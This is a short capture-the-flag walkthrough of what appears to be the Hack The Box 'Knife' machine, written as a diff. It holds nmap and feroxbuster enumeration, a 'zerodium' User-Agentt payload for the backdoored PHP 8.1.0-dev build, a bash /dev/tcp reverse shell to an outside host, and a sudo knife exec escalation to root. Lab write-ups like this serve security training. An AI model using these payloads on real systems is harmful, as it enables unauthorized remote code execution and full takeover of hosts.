@@ -1,0 +1,89 @@
+let's enumerate first:
+command: sudo rustscan -a 10.10.10.242
+result:
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80 10.10.10.242
+result:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 be549ca367c315c364717f6a534a4c21 (RSA)
+|   256 bf8a3fd406e92e874ec97eab220ec0ee (ECDSA)
+|_  256 1adea1cc37ce53bb1bfb2b0badb3f684 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title:  Emergent Medical Idea
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.4 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+access: http://10.10.10.242/
+response: 
+HTTP/1.1 200 OK
+Date: Mon, 26 Jun 2023 20:30:59 GMT
+Server: Apache/2.4.41 (Ubuntu)
+X-Powered-By: PHP/8.1.0-dev
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 2406
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+take attention:
+X-Powered-By: PHP/8.1.0-dev
+
+command: ./feroxbuster -u http://10.10.10.242 -w /snap/feroxbuster/common/wordlist/raft-medium-directories.txt
+result:
+403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET      220l      526w     5815c http://10.10.10.242/
+
+exploit PHP/8.1.0-dev
+let's intercet using buirpsuite change to this request on User-Agennt header:
+GET / HTTP/1.1
+Host: 10.10.10.242
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agentt: zerodium system("id");
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+response:
+uid=1000(james) gid=1000(james) groups=1000(james)
+
+command: nc -lvnp 7979
+get shell:
+GET / HTTP/1.1
+Host: 10.10.10.242
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agentt: zerodium system("bash -c 'bash -i >& /dev/tcp/10.10.16.19/7979 0>&1'");
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+command: sudo -l
+Matching Defaults entries for james on knife:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife
+
+let'ts go to root
+command: sudo knife exec -E "exec '/bin/bash'"
+command: cat /root/root.txt
+result:
+048fb29ef8de5d51980ab1fd4841d151
+
+resource:
+https://0xdf.gitlab.io/2021/08/28/htb-knife.html#shell-as-root
